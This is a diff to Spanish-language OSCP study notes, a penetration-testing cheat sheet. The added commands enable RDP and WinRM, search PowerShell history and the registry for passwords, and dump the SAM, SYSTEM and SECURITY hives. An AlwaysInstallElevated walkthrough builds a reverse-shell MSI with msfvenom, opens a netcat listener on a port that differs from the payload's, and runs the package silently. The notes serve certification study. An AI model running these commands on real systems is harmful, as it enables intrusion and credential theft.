@@ -113,6 +113,21 @@ Apuntes para la certicación OSCP.
 
 ##  1. <a name='comandos'></a>Comandos
 
+### Windows
+
+##### Habilitar WinRM
+
+```powershell
+winrm quickconfig
+```
+
+##### Habilitar RDP
+
+```powershell
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+```
+
 ##  2. <a name='information-gathering'></a>Information Gathering
 
 ###  2.1. <a name='fping'></a>Fping
@@ -816,7 +831,7 @@ snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 | 1.3.6.1.4.1.77.1.2.25  | Cuentas de usuarios               |
 | 1.3.6.1.2.1.6.13.1.3   | Puertos TCP locales               |
 
-Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html)
+Referencias: [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
 ###  3.6. <a name='rdp-(3389)'></a>RDP (3389)
 
@@ -968,7 +983,7 @@ php magescan.phar scan:all http://<RHOST>
 ```
 
 ##  5. <a name='pivoting'></a>Pivoting
----
+
 ###  5.1. <a name='chisel'></a>Chisel
 ####  5.1.1. <a name='servidor-(atacante)'></a>Servidor (Atacante)
 
@@ -1087,6 +1102,8 @@ query user
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 [System.Environment]::OSVersion.Version
+Get-ComputerInfo
+Get-ComputerInfo | Select OsName,OsVersion,OsType
 
 # variable de entorno
 echo %PATH%
@@ -1232,6 +1249,10 @@ net view \\172.16.0.1 /all
 Buscamos información sensible.
 
 ```powershell
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\elliot\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
@@ -1239,6 +1260,21 @@ Select-String -Path C:\Users\elliot\Documents\*.txt -Pattern password
 
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 findstr /spin "password" *.*
+```
+
+Buscar contraseñas en el Registro
+
+```powershell
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+##### Volcado de credenciales
+
+```powershell
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\system c:\temp\system.save
+reg.exe save hklm\security c:\temp\security.save
 ```
 
 Algunos otros archivos en los que podemos encontrar credenciales incluyen lo siguiente:
@@ -1273,7 +1309,7 @@ cmdkey /list
 ```
 
 ```powershell-session
-PS C:\htb> runas /savecred /user:hacklab.local\bob "whoami"
+runas /savecred /user:hacklab.local\bob "whoami"
 ```
 ##### Windows Autologon
 
@@ -1282,8 +1318,6 @@ Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-serve
 ```powershell
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
-
-
 
 ##### Enumeración automatizada
 
@@ -1294,8 +1328,66 @@ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
 
 ####  9.1.2. <a name='escalación-de-privilegios-1'></a>Escalación de Privilegios
 
+##### AlwaysInstallElevated
 
+La política Always Install Elevated es una configuración en Windows que permite a los usuarios estándar instalar aplicaciones con privilegios elevados. Cuando esta política está habilitada, cualquier instalación de aplicación iniciada por un usuario estándar se ejecuta con derechos administrativos, evitando así las solicitudes de **Control de Cuentas de Usuario (UAC)**.
 
+###### Comprobar que la política AlwaysInstallElevated esta habilitada
+
+```powershell
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
+Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
+```
+
+###### Cómo funciona
+
+Cuando la configuración **Always Install Elevated** está habilitada, ocurre lo siguiente:
+
+1. **Elevación de Instalaciones**:
+    - Los usuarios estándar pueden instalar aplicaciones sin necesidad de proporcionar credenciales de administrador. Esto permite que los paquetes MSI se ejecuten automáticamente con permisos administrativos.
+2. **Bypass de UAC**:
+    - El sistema no muestra el aviso de UAC, lo que reduce la visibilidad para el usuario y puede facilitar la instalación de software no autorizado o malicioso.
+
+###### Explotación de Always Install Elevated: Creación y Ejecución de un MSI Malicioso
+
+###### 1. Generar un Paquete MSI Malicioso
+
+Para aprovechar esta política, podemos crear un paquete MSI malicioso para obtener una reverse shell hacia nuetro equipo de atacante. Esto se puede hacer utilizando `msfvenom`. En este ejemplo, configuramos el host local `LHOST` como `192.168.56.5` y el puerto local `LPORT` como `4444`.
+
+El comando para generar el paquete MSI es:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=4444 -f msi > shell.msi
+```
+
+###### 2. Transferir el Archivo MSI al Objetivo
+
+Una vez generado el archivo `shell.msi`, debemos transferirlo a la máquina objetivo. Podemos usar algunos métodos como:
+
+- Compartir archivos (por ejemplo, a través de SMB).
+- Subirlo a un servidor web y descargarlo en la máquina objetivo.
+- Copiarlo directamente si tienes acceso físico o remoto.
+
+###### 3. Configurar un Listener
+
+El la máquina atacante nos ponemos en escucha con netcat por el puerto indicado, en este caso `4444`.
+
+```bash
+rlwrap nc -lnvp 444
+```
+
+###### 4. Ejecutar el Paquete MSI en el Objetivo
+
+En la máquina objetivo, ejecutamos el paquete MSI utilizanod el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:
+
+```powershell
+msiexec /i C:\temp\shell.msi /quiet /qn /norestart
+```
 
 ###  9.2. <a name='linux-2'></a>Linux
 
@@ -1319,8 +1411,8 @@ Enlaces a las distintas herramientas y recursos.
 | Nombre    | URL                                                                      |
 | --------- | ------------------------------------------------------------------------ |
 | Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
-| Ligolo-ng | https://github.com/nicocha30/ligolo-ng       
-                            |
+| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
+                            
 ###  11.2. <a name='information-gathering-1'></a>Information Gathering
 
 | Nombre | URL                          |
